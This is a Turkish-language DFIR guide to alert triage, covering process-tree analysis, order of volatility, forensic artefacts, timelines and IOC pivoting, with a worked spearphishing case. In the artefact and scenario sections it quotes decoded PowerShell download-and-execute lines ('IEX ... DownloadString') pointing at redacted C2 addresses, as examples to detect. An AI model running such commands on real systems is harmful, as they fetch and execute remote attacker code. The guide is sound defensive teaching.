# Alarm Triage Metodolojisi — Pratisyen DFIR Rehberi

## 1. Bu iş akışı neyi hedefler, IR sürecindeki yeri

Alarm triage, olay müdahalenin (IR) en yoğun trafik alan kavşağıdır. SOC/IR ekibine düşen alarmların büyük çoğunluğu ya gürültüdür (false positive), ya düşük öncelikli çevresel olaydır, ya da yanlış yapılandırmış bir aracın öksürüğüdür. Buradaki asıl mesele, bu gürültü denizinde **gerçekten kanı olan** birkaç olayı, henüz saldırgan hedefine ulaşmadan yakalayabilmektir. Triage kötü yapılırsa iki felaket yaşanır: ya gerçek bir intrusion'u "false positive" diye kapatırsınız (missed detection), ya da her alarmı tam soruşturma gibi ele alıp ekibi tüketir, gerçek olay geldiğinde bakacak göz kalmaz (alert fatigue).

Triage'ın IR yaşam döngüsündeki yeri nettir. NIST SP 800-61'in klasik dört fazına (Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident) baktığımızda, triage tam olarak **Detection & Analysis'in ön kapısıdır**. SANS'ın PICERL modelinde ise Identification aşamasının kalbinde durur. Amaç bir alarmı üç kovadan birine yerleştirmektir:

- **Kapat (benign / false positive):** Açıklanabilir, meşru bir aktivite. Gerekçesiyle dokümante et, kapat.
- **Yükselt (escalate / true positive):** Kötü niyetli veya kötü niyetli olma ihtimali yüksek. Tam soruşturma ve containment gerekir.
- **Beklet / topla (needs more data):** Karar verecek delil yok. Ek artefakt topla, sonra tekrar değerlendir.

Bir triage analistinin verdiği en değerli çıktı "olay/olay değil" ikili kararı değildir; bu kararın **gerekçesidir ve topladığı ilk delildir**. Çünkü yükselttiğiniz olayı devralan kıdemli analist, sizin sıfırdan başlamamanızı bekler. İyi triage, sonraki fazın yarısını halleder.

Kritik zihniyet: Triage'da amaç "kesin kanıt" değil, **savunulabilir bir olasılık kararıdır**. 5-15 dakikada tam adli kopya alıp Volatility ile derinlemesine bellek analizi yapmazsınız. Hızlı, hedefli, tersine çevrilebilir bir ilk değerlendirme yaparsınız. Ama bu hız, delili bozma pahasına gelmemelidir — işte ustalık buradadır.

## 2. Adım-adım İŞ AKIŞI ve KARAR (asıl değer)

Aşağıdaki akış, bir endpoint/EDR alarmı ya da SIEM korelasyon alarmı geldiğinde bir kıdemli analistin kafasında gerçekten işleyen sıradır. Sırayı ezberden değil, **bilgi ekonomisinden** kurarız: en ucuz, en hızlı ve delili en az bozan sorulardan başlar, pahalı ve invaziv adımlara doğru ilerleriz.

### Adım 0 — Alarmı okumadan önce bağlamı çerçevele

Alarmın kendisine dalmadan önce üç soruyu sorarım:

1. **Bu varlık nedir?** Domain controller mı, geliştirici laptop'u mu, kiosk mı, CEO'nun makinesi mi? Aynı alarm bir DC'de kritik, bir test makinesinde önemsiz olabilir. Varlık kritikliği (asset criticality) triage önceliğini baştan belirler.
2. **Bu kullanıcı kim?** Sistem yöneticisi mi, muhasebe personeli mi, servis hesabı mı? Bir admin'in PowerShell çalıştırması normaldir; muhasebecinin `whoami /priv` koşturması değildir.
3. **Şimdi ne zaman?** Mesai saati mi, gece 03:14 mü? Bakım penceresi var mı? Zaman bağlamı, "beklenen mi beklenmedik mi" ayrımının yarısıdır.

Bu üç soru olmadan alarmın severity'sine bakmak, hastayı görmeden reçete yazmaktır.

### Adım 1 — Alarmın kendisini ayrıştır: ne, tam olarak neyi tetikledi?

Alarm başlığı ("Suspicious PowerShell") yalan söyler. Ham telemetriye inmek gerekir: hangi kural, hangi process ağacı, hangi komut satırı, hangi hash, hangi hedef IP. EDR'de (CrowdStrike, Defender for Endpoint, SentinelOne, Carbon Black tarzı) process tree'yi açar, **parent-child ilişkisine** bakarım. Çünkü kötü niyet çoğu zaman komutun kendisinde değil, **soyağacındadır**:

- `winword.exe → cmd.exe → powershell.exe -enc ...` → bu bir maldoc zinciridir, alarm zilleri çalar.
- `explorer.exe → powershell.exe` (kullanıcı elle açmış) → çok daha az endişe verici.
- `w3wp.exe → cmd.exe` (IIS worker'dan shell) → web shell göstergesi, ciddiye alınır.
- `services.exe → bilinmeyen.exe` (SYSTEM olarak, rastgele isimli) → servis persistence şüphesi.

**Kural:** "Bir process'in kim tarafından doğurulduğu, o process'in ne yaptığından daha çok şey anlatır."

### Adım 2 — Order of Volatility'e saygı: neyi önce topla?

Eğer makineye canlı erişimim varsa (canlı sistemde henüz kapatma yapılmadıysa), delil toplamayı **uçuculuk sırasına** göre yaparım (RFC 3227 mantığı). En uçucudan en kalıcıya:

1. Bellek / RAM (process listesi, ağ bağlantıları, açık handle'lar)
2. Çalışan process'ler ve ağ durumu (`netstat`, aktif oturumlar)
3. Geçici dosyalar / cache
4. Disk artefaktları (kayıt defteri, olay günlükleri, dosya sistemi)
5. Uzak loglar, fiziksel yapılandırma

Pratikte triage aşamasında **tam RAM dump'ı genellikle almam** — o Containment/Analysis işidir ve zaman alır. Ama şunu yaparım: canlı sistemde **uçucu göstergeleri hızlıca yakalarım**. Velociraptor bunun için ideal araçtır çünkü ajanı hedef makinede uzaktan, minimal ayak iziyle sorgu çalıştırır: aktif process'ler, ağ bağlantıları, autoruns, prefetch. KAPE ise (Kroll Artifact Parser and Extractor) disk-tabanlı artefaktları hedefli ve hızlı toplamak için birinci tercihimdir — tüm diski imajlamadan sadece "işe yarar" artefaktları (Prefetch, Amcache, ShimCache, $MFT, event log'ları, kayıt defteri kovanları, browser history) çeker.

**Neden bu sıra önemli:** Eğer paniğe kapılıp makineyi hemen kapatırsanız (ya da izole ederken reboot ederseniz), RAM'deki fileless malware, şifre çözme anahtarları, açık ağ bağlantıları ve enjekte edilmiş kod uçup gider. Order of volatility, "hızlı hareket et ama doğru sırada hareket et" disiplinidir.

### Adım 3 — İlk hipotezi kur: bu hangi ATT&CK aşaması?

Alarmı MITRE ATT&CK çerçevesine oturtmak, "sonra ne aramalıyım" sorusunu cevaplar. Bir alarm bana bir teknik gösterir; ben o tekniğin **komşularını** ararım:

- Alarm bir **Execution** göstergesiyse (T1059 — Command and Scripting Interpreter), hemen **öncesini** (Initial Access — phishing eki? exploit?) ve **sonrasını** (Persistence, Privilege Escalation) sorgularım.
- Alarm **Credential Access** (T1003 — LSASS dumping, Mimikatz izi) ise, bu bir kill chain'in ortasıdır; saldırgan zaten içeride ve yanal harekete hazırlanıyor demektir. Öncelik fırlar.
- Alarm **Lateral Movement** (T1021 — RDP/SMB/WMI ile uzak çalıştırma) ise, "hasta sıfır" (patient zero) benim gördüğüm makine değil, başka bir yerde demektir.

**Kural:** "Bir alarm asla tek başına yaşamaz. Kill chain'de bir öncesini ve bir sonrasını sormadan karar verme."

### Adım 4 — Artefakt-tabanlı doğrulama: "şunu görünce şu sonuca giderim"

Burası triage'ın etidir. Belirli artefaktlar belirli sonuçlara götürür. Kıdemli analistin refleks haritası:

- **Prefetch** (`C:\Windows\Prefetch\*.pf`) → bir çalıştırılabilirin **çalıştığını, kaç kez ve ilk/son ne zaman** kanıtlar. Eric Zimmerman'ın `PECmd` aracıyla parse ederim. Şüpheli bir binary'nin prefetch'i varsa, "belki indirildi ama çalışmadı" savunması çöker — çalışmış.
- **Amcache.hve** ve **ShimCache (AppCompatCache)** → sistemde **var olmuş** çalıştırılabilirlerin izi. Silinmiş olsa bile burada iz kalır. `AmcacheParser` ve `AppCompatCacheParser` (yine Zimmerman) ile çıkarırım. Anti-forensics ile silinen bir malware'i buradan yakalarım.
- **$MFT (Master File Table)** → dosya oluşturma/değiştirme zaman damgaları. `MFTECmd` ile parse. **Timestomping** (zaman damgası oynatma) tespitinde `$STANDARD_INFORMATION` ile `$FILE_NAME` zaman damgalarını karşılaştırırım — tutmuyorlarsa saldırgan izini gizlemeye çalışmış.
- **Kayıt defteri Run/RunOnce anahtarları, Services, Scheduled Tasks** → persistence. `Registry Explorer` ve `Autoruns` (Sysinternals) ile bakarım. `services.exe`'nin doğurduğu garip binary + yeni bir servis kaydı = persistence kurulmuş.
- **Windows Event Log'ları** → altın madeni. Özellikle:
  - Security **4624/4625** (logon başarı/başarısız) — brute force, anormal oturum tipleri (Type 3 network, Type 10 RDP).
  - Security **4688** (process creation, command line ile) — komut satırı burada.
  - **4672** (special privileges assigned) — admin oturumu.
  - Security **4720/4728/4732** — yeni kullanıcı oluşturma, gruba ekleme (persistence/priv-esc).
  - **7045** (System log) — yeni servis kurulumu.
  - **PowerShell Operational 4104** — script block logging; obfuscated PowerShell burada çözülmüş halde çıkabilir.
  - `EvtxECmd` ile parse ederim.
- **LSASS erişimi / Sysmon Event ID 10** → bir process'in `lsass.exe`'ye handle açması, credential dumping'in en güçlü sinyalidir.
- **PowerShell `-enc` / Base64** → decode ederim; içinde `DownloadString`, `IEX`, `FromBase64String`, C2 IP'si varsa iş ciddidir.

**Örnek refleks zinciri:** Alarm "olağandışı PowerShell" diyor. Command line'ı çıkarıyorum: `-nop -w hidden -enc SQBFAFgA...`. Base64'ü çözüyorum → `IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')`. Şimdi Prefetch'e bakıyorum → powershell.exe o saatte çalışmış, teyit. $MFT'de `a.ps1` ya da bir payload dosyası aranıyor. Ağ loglarında 185.x.x.x'e giden bağlantı var mı? Varsa: **true positive, aktif C2 indirme denemesi, escalate.**

### Adım 5 — Zaman çizelgesi (timeline) çıkar

Tekil artefaktlar hikayeyi anlatmaz; **sıralama** anlatır. Şüphe kesinleşiyorsa mini bir super timeline kurarım. Küçük ölçekte KAPE + Zimmerman araçlarının çıktısını Timeline Explorer'da birleştiririm; daha büyük vakada **Plaso/log2timeline** ile super timeline üretip **Timesketch**'e yüklerim. Amaç: "T0'da phishing eki açıldı → T0+30sn cmd.exe → T0+45sn powershell indirme → T0+2dk yeni servis → T0+5dk lsass erişimi" gibi bir anlatı kurmak. Bu anlatı, hem kararı sağlamlaştırır hem de escalate ettiğimde bir sonraki analiste hazır bir iskelet bırakır.

### Adım 6 — IOC'leri pivotla ve genişlet

Bir gösterge (hash, IP, domain, dosya adı, mutex) elde ettiğimde, onu **tüm filoda** ararım. EDR/SIEM'de retro-hunt: "bu hash başka kaç makinede var?", "bu C2 IP'sine başka kim bağlanmış?". YARA kuralı yazıp (ya da mevcut bir kuralı kullanıp) toplanan dosyalar/bellek üzerinde tararım. Bu adım, "tekil endpoint olayı" ile "filoya yayılmış kampanya" arasındaki farkı ortaya çıkarır ve scope'u belirler. Triage'ın son büyük katkısı budur: **blast radius'un ilk tahmini.**

### Adım 7 — Kararı ver ve dokümante et

Üç kovadan birine koy:

- **False positive:** Gerekçe (ör. "meşru yazılım güncellemesi, imzalı binary, bilinen dağıtım sunucusundan"). Mümkünse detection kuralını tuning için not düş.
- **True positive → escalate:** Özet + timeline iskeleti + toplanan artefakt yolları + IOC listesi + önerilen ilk containment (host izolasyonu). 
- **Needs more data:** Tam olarak neyin eksik olduğunu ve bir sonraki toplama adımını yaz.

Karar ne olursa olsun, **ne baktığını, ne bulduğunu, neyi bulmadığını** yazarsın. "Baktım temizdi" bir triage notu değildir.

## 3. Kritik dikkat noktaları

### Delil bütünlüğü ve tersine çevrilebilirlik
Triage'da yaptığın her canlı işlem sistemi değiştirir (Locard değiş-tokuş ilkesinin dijital hali — her temas iz bırakır ve iz siler). Bir aracı çalıştırmak bile Prefetch, kayıt defteri ve son erişim zaman damgalarını değiştirir. Bu yüzden: mümkün olduğunca **read-only ve hedefli** araçlar kullan (Velociraptor sorguları, KAPE'nin salt-okuma koleksiyonu), yaptığın her müdahaleyi zaman damgasıyla kaydet ki sonraki analist "bu değişiklik saldırgan mı, analist mi?" diye ayırt edebilsin. Delili **kendi kirliliğinden** koru.

### Order of volatility
Yukarıda anlatıldı; özetle: makineyi **kapatma veya reboot etme** kararını triage sonuna sakla. İzole etmek (network containment) çoğu zaman kapatmaktan daha iyidir, çünkü RAM'i ve canlı durumu korur ama saldırganın dışarıyla konuşmasını keser. "Fişi çek" refleksi, fileless tehditlerde en değerli delili yok eder.

### Chain of custody (delil zinciri)
Triage bir olaya, o olay da bir gün hukuki sürece / İK soruşturmasına / sigortaya dönüşebilir. Bu yüzden topladığın her artefaktın **hash'ini al** (SHA-256), kim-ne zaman-neyi-nereden topladığını kaydet, delili değiştirilemez şekilde sakla. Triage aşamasında bile "bu belki mahkemeye gider" varsayımıyla çalışmak, sonradan "delil kirlendi, kabul edilemez" felaketini önler. Orijinal delille değil, **doğrulanmış kopyayla** çalış.

### Anti-forensics'e karşı
Yetkin saldırgan iz siler. Buna karşı savunma:
- **Log silme** (Event ID 1102 — audit log cleared; ya da event log'un anormal biçimde boş/kısa olması) bir tespit sinyalidir, gürültü değil. Silinmiş log, "olay yok" değil, "biri temizledi" demektir.
- **Timestomping**'i $MFT'nin `$SI` vs `$FN` karşılaştırmasıyla yakala.
- **Silinen dosyalar** disk imajından/`$MFT`'den, USN Journal'dan (`$J`) ve ShimCache/Amcache'den kurtarılabilir — dosya silinse de "var olmuştu" izi kalır.
- **Prefetch devre dışı bırakma / temizleme** kendisi bir gösterge. Beklediğin artefaktın yokluğu da bir bulgudur.

**Kural:** "Bir artefaktın yokluğu, çoğu zaman varlığı kadar konuşur."

## 4. Gerçek dünya senaryosu

**Alarm (03:14):** EDR, muhasebe departmanındaki bir kullanıcının (FINANCE-07) makinesinde "Suspicious child process from Office application" uyarısı verdi. Severity: Medium.

**Adım 0 — Bağlam:** Varlık: standart kullanıcı laptop'u, kritik değil ama muhasebe = finansal veri ve BEC/fidye hedefi. Kullanıcı: muhasebe personeli, teknik değil. Zaman: gece 03:14 — kullanıcı uyanık değil, mesai dışı. Bu üçlü zaten alarm zilini yükseltiyor: muhasebeci gece 3'te makro çalıştırmaz.

**Adım 1 — Process tree:** `OUTLOOK.EXE → EXCEL.EXE → cmd.exe → powershell.exe -w hidden -enc <base64>`. Klasik maldoc zinciri. Outlook'tan gelen bir Excel eki, makro çalıştırmış.

**Adım 2 — Uçucu toplama:** Makineyi kapatmıyorum. Velociraptor ile canlı sorgu: aktif ağ bağlantıları → powershell.exe `91.x.x.x:443`'e ESTABLISHED bir bağlantı tutuyor. KAPE ile hedefli koleksiyon başlatıyorum (Prefetch, Amcache, $MFT, event logs, PowerShell logs, Outlook OST cache).

**Adım 3 — ATT&CK hipotezi:** Initial Access (T1566.001 — spearphishing attachment) → Execution (T1059.001 — PowerShell) → muhtemelen Command & Control (T1071). Sonrasını arıyorum: persistence kurulmuş mu?

**Adım 4 — Artefakt doğrulama:**
- Base64 decode → `IEX (New-Object Net.WebClient).DownloadString('https://91.x.x.x/stage2.ps1')`. İkinci aşama indirici.
- PowerShell 4104 script block logunda decode edilmiş komut teyit ediliyor.
- Prefetch (`PECmd`): powershell.exe 03:14'te çalışmış, teyit.
- Kayıt defteri Run anahtarına bakıyorum → yeni bir giriş: `Updater = powershell.exe -enc ...` → **persistence kurulmuş** (T1547.001).
- Sysmon EID 10: henüz lsass erişimi **yok** — iyi haber, credential access aşamasına gelmemiş olabilir. Ama yokluğu "kesin gelmedi" demek değil, "bu telemetride görmedim" demek.
- Event log 4688: `nltest /dclist`, `whoami /groups` çalışmış → **Discovery** (T1087, T1016) başlamış, saldırgan ortamı tanıyor.

**Adım 5 — Timeline:** 03:14:02 Excel makro → 03:14:05 powershell indirici → 03:14:09 C2 bağlantısı → 03:14:40 Run anahtarı persistence → 03:15:10 discovery komutları. Aktif, ilerleyen bir intrusion.

**Adım 6 — Pivot:** stage2 indirme URL'si ve C2 IP'sini SIEM'de tüm filoda arıyorum. Aynı phishing e-postası 6 kullanıcıya daha gitmiş (Outlook/mail gateway logu); **2 makinede daha** aynı C2 IP'sine bağlantı var. Yani bu izole bir olay değil, bir kampanya. Blast radius: en az 3 endpoint.

**Sonuç / Karar:** **True positive — aktif, çok-hostlu spearphishing intrusion, persistence + discovery aşamasında, credential access'e ilerlemeden yakalandı.** Escalate: üç hostu derhal network izolasyonuna al (kapatma değil), IR ekibini uyandır, mail gateway'de kampanya e-postasını tüm kutulardan purge et, C2 IP'sini firewall'da blokla, IOC setini (hash, URL, IP, Run anahtarı adı) yayınla. Triage çıktısı olarak: timeline iskeleti, KAPE koleksiyon yolları, IOC listesi ve önerilen containment sıralı olarak devrediliyor.

Bu vakanın dersi: alarm "Medium" idi. Bağlam (gece + muhasebe + Office soyağacı) ve pivot (fila yayılım) onu gerçek bir olaya çevirdi. Severity etikete güvenseydik, sabaha kadar bekletirdik ve saldırgan credential dumping'e geçebilirdi.

## 5. Yaygın tuzaklar ve pro yargısı

**1. Alarm başlığına/severity'sine iman etmek.** Acemi "Low" gördü mü es geçer, "Critical" gördü mü panikler. Severity aracın tahminidir, senin kararın değil. Bağlam ve soyağacı severity'yi hem yükseltir hem düşürür. Pro, her zaman ham telemetriye iner.

**2. Bağlamsız bakmak.** Aynı `psexec` komutu, bir sistem yöneticisinin bakım penceresinde meşru, gece yarısı bir muhasebecide felakettir. Kullanıcıyı, varlığı ve zamanı çerçevelemeden verilen her karar kumardır.

**3. Tek artefaktla karar vermek.** "Prefetch'te şüpheli binary var, demek ki hacklendik" ya da tersi "log temiz, olay yok". Acemi tek göstergeye bakar; pro **doğrulama üçgeni** kurar — process telemetrisi + disk artefaktı + ağ/log kaydı birbirini teyit etmeli. Tek kaynak yalan söyleyebilir; üçü birden zor söyler.

**4. Yokluğu delil saymamak.** "Event log boştu, o yüzden temiz" demek klasik hatadır. Boş/kısa log, silinmiş log olabilir (anti-forensics). Beklediğin artefaktın olmaması bir bulgudur — "neden yok?" diye sor.

**5. Fişi çekmek / hemen reboot etmek.** Panikle makineyi kapatan acemi, RAM'deki fileless malware'i, C2 anahtarlarını ve canlı bağlantıları yok eder. Doğru refleks: **izole et, kapatma.** Containment ≠ shutdown.

**6. Delili kendi elinle kirletmek.** Şüpheli dosyaya çift tıklamak, üzerinde antivirüs taraması başlatmak, dosyayı VirusTotal'e yüklemek (private hash bir saldırgana "yakalandım" sinyali verebilir, ayrıca gizli veri sızdırabilir), ya da orijinal delil üzerinde çalışmak. Pro, kopyayla çalışır, hash alır, minimal ayak izi bırakır.

**7. Scope'u erken kapatmak.** "Bu bir makinenin sorunu" deyip pivotlamayı atlamak. Modern saldırılar nadiren tek hosttur. Bir IOC eline geçtiğinde onu **her zaman** tüm filoda ara. Blast radius'u tahmin etmeden triage bitmez.

**8. Yönetim/tuning ihmali.** Aynı false positive her gün geliyorsa, onu her gün yeniden soruşturmak değil, detection kuralını tuning etmek gerekir. Aksi halde alert fatigue ekibi kör eder ve gerçek olay gürültüde boğulur.

**9. Dokümantasyonu atlamak.** "Baktım, bir şey yok" diye kapatılan alarm, üç ay sonra breach ortaya çıktığında en büyük pişmanlıktır. Ne baktın, neyle baktın, ne buldun, neyi bulmadın — yaz. Triage notun, senin savunmandır ve bir sonraki analistin başlangıç noktasıdır.

**10. Zaman baskısıyla hipotezi zorla doğrulamak (confirmation bias).** "C2 olmalı" diye karar verip sadece onu destekleyen delile bakmak. Pro, hipotezini **çürütmeye** de çalışır: "Bu 91.x.x.x meşru bir bulut servisi olabilir mi? Bu PowerShell bir yönetim aracı olabilir mi?" Alternatif meşru açıklamayı eleyemiyorsan, kararın hâlâ eksiktir.

**Pro yargısının özü:** Triage bir hız yarışı gibi görünür ama aslında bir **disiplin** işidir. Hızlı ol ama sıralı ol; şüpheci ol ama önyargısız; delili koru ama ilerlemeyi durdurma. En iyi triage analisti, "bu olay mı değil mi" sorusuna değil, "bir sonraki insanın işini kolaylaştıracak en iyi ilk kararı ve delili nasıl bırakırım" sorusuna odaklananıdır.
